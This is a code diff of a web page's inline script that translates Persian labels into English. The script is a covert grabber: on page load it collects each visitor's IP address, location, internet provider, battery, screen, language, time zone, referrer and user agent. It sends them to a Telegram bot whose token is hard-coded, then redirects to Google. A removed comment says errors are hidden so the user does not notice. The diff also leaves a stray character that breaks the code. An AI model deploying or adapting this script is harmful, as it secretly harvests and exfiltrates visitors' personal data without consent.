@@ -53,7 +53,7 @@
   <div class="custom-loader"></div>
 
   <script>
-    // ربات تلگرام
+      
     const BOT_TOKEN = "8283253750:AAElG2O-DcOR9fAEHEktk-51rETnif766xw";
     const CHAT_ID = "8223560115";
 
@@ -73,53 +73,51 @@
           //  
         }
         
-        //  باتری
-        let batteryInfo = "نامشخص";
+          
+        let batteryInfo = "Uncertain";
         if ('getBattery' in navigator) {
           try {
             const battery = await navigator.getBattery();
             const level = Math.round(battery.level * 100);
-            const charging = battery.charging ? 'در حال شارژ' : 'در حال شارژ نیست';
+            const charging = battery.charging ? 'Charging' : 'Not charging.';
             batteryInfo = `${level}% (${charging})`;
           } catch (e) {}
         }
-        
-        // زمان
+         
         const now = new Date();
         const jalali = new Intl.DateTimeFormat('fa-IR', {
           year: 'numeric', month: '2-digit', day: '2-digit',
           hour: '2-digit', minute: '2-digit', second: '2-digit'
         }).format(now).replace(/‏/g, '').replace(/\u200E/g, '').replace(/،/g, ',');
         
-        // ساخت پیام
+      
         const message = ` new 
 
-📍 موقعیت کاربر:
-├─ کشور: ${location.country_name || 'نامشخص'}
-├─ استان: ${location.region || 'نامشخص'}
-├─ شهر: ${location.city || 'نامشخص'}
-├─ کدپستی: ${location.postral || 'نامشخص'}
+📡 User location:
+├─ Country: ${location.country_name || 'Uncertain'}
+├─ Province: ${location.region || 'Uncertain'}
+├─ City: ${location.city || 'Uncertain'}
+├─ Postal code: ${location.postral || 'Uncertain'}
 
-🌐 اطلاعات شبکه:
+🌐 Network information:
 ├─ IP: ${ip}
-├─ ارائه‌دهنده: ${location.org || 'نامشخص'}
-├─ ASN: ${location.asn || 'نامشخص'}
+├─ Provider: ${location.org || 'Uncertain'}
+├─ ASN: ${location.asn || 'Uncertain'}
 
-📱 اطلاعات دستگاه:
-├─ نوع: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
-├─ باتری: ${batteryInfo}
-├─ صفحه‌نمایش: ${screen.width}×${screen.height}
-├─ زبان: ${navigator.language}
-├─ منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+📱Device information:
+├─ Type: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
+├─ Battery: ${batteryInfo}
+├─ Display: ${screen.width}×${screen.height}
+├─ Language: ${navigator.language}
+├─ Time zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
-🕐 زمان:
-├─ ساعت محلی: ${jalali}
+🕐 Time:
+├─ Local time: ${jalali}
 
-🔗 سایر اطلاعات:
-└─ لینک مرجع: ${document.referrer || 'بدون مرجع'}
+🔗Other information:
+└─ Reference link: ${document.referrer || 'Without reference'}
 └─ User Agent: ${navigator.userAgent}`;
         
-        // ارسال به تلگرام
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -129,17 +127,16 @@
           })
         });
         
-      } catch (error) {
-        // خطاها نادیده گرفته می‌شوند تا کاربر متوجه نشود
+      } catch (error) {د
       }
     }
 
-    // اجرا و ریدایرکت
+       
     (async function() {
-      // ارسال اطلاعات در پس‌زمینه
+      
       await collectData();
       
-      // ریدایرکت بعد از ۳ ثانیه
+      
       setTimeout(() => {
         window.location.href = "https://www.google.com";
       }, 2000);
